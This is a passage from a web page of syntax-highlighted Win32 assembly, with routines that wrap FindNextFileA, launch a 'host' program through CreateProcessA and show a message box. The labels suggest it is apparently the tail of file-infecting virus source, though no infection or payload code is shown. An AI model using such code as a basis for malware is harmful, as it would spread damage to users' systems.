</span><span class="sc5">Fnext</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;bool FindNextFileA( handle, pointer Find_Data)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">find_file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Fhandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNextFileA</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">RunIt</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessInfo</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartupInfo</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;null        current dir</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;null         enviroment</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">10h</span><span class="sc0">                     </span><span class="sc1">;creat_new_console  creatflags</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;False = 0    inherit handles</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;null         thread security</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;null         process security</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">blank</span><span class="sc0">        </span><span class="sc1">;command line</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_name</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">;file to run </span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">Call</span><span class="sc0">   </span><span class="sc5">CreateProcessA</span><span class="sc0">

         </span><span class="sc6">OR</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">                  </span><span class="sc1">;OOPS CANT FIND FILE</span><span class="sc0">
         </span><span class="sc1">;JnZ   End_it                       ;SHOW MESSAGE BOX</span><span class="sc0">
                                        </span><span class="sc1">; on the other hand why bother</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Box_it</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">title1</span><span class="sc0">       
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mess</span><span class="sc0">         </span><span class="sc1">;find_file + Find_data_name   </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
 
        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">HOST</span><span class="sc0">
</span></div></body>
</html>
